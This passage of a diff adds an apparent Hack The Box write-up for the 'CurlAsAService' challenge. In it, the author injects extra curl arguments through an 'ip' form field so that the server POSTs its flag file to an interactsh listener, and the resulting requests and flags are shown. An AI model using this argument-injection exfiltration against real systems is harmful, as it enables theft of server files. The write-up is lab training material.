+should be read. Therefore, we can coerce <code>curl</code> into sending data instead of
+querying data!</p>
+<p>Since we can control the queried URL, and there's no URL validation in place, we
+can specify a server we control and see the data sent in the request to
+essentially obtain a LFI.</p>
+<h3 id="preparation">Preparation</h3>
+<p>I'll use <code>interactsh</code> to setup a fake server.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> interactsh-client<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>http-only</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] cnvhqtlut6afj4d5cq20q5rhqnorn36kb.oast.live
+</span></code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's coerce the website into sending the <code>flag</code> file:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://127.0.0.1:1337/api/curl<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ip=http://cnvhqtlut6afj4d5cq20q5rhqnorn36kb.oast.live -X POST -d @../../flag<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">------------
+</span><span class="z-text z-plain">HTTP Request
+</span><span class="z-text z-plain">------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">POST / HTTP/1.1
+</span><span class="z-text z-plain">Host: cnvhqtlut6afj4d5cq20q5rhqnorn36kb.oast.live
+</span><span class="z-text z-plain">Accept: */*
+</span><span class="z-text z-plain">Content-Length: 26
+</span><span class="z-text z-plain">Content-Type: application/x-www-form-urlencoded
+</span><span class="z-text z-plain">User-Agent: curl/7.64.0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HTB{f4k3_fl4g_f0r_t3st1ng}
+</span></code></pre>
+<p>We got the testing flag!</p>
+<h1 id="socket-94-237-49-166-45094">Socket <code>94.237.49.166:45094</code></h1>
+<p>Let's replicate this process to obtain the flag on the target machine.</p>
+<pre class="z-code"><code><span class="z-text z-plain">------------
+</span><span class="z-text z-plain">HTTP Request
+</span><span class="z-text z-plain">------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">POST / HTTP/1.1
+</span><span class="z-text z-plain">Host: cnvhqtlut6afj4d5cq20q5rhqnorn36kb.oast.live
+</span><span class="z-text z-plain">Accept: */*
+</span><span class="z-text z-plain">Content-Length: 32
+</span><span class="z-text z-plain">Content-Type: application/x-www-form-urlencoded
+</span><span class="z-text z-plain">User-Agent: curl/7.64.0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HTB{f1l3_r3tr13v4l_4s_4_s3rv1c3}
+</span></code></pre>
+<p>We got the flag!</p>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/challenges/curlasaservice/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated this challenge as 'Very easy'. The path leading to the flag was rather
+obvious, and straightforward to exploit, but I lost a bit of time trying to
+obtain an OS command injection.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
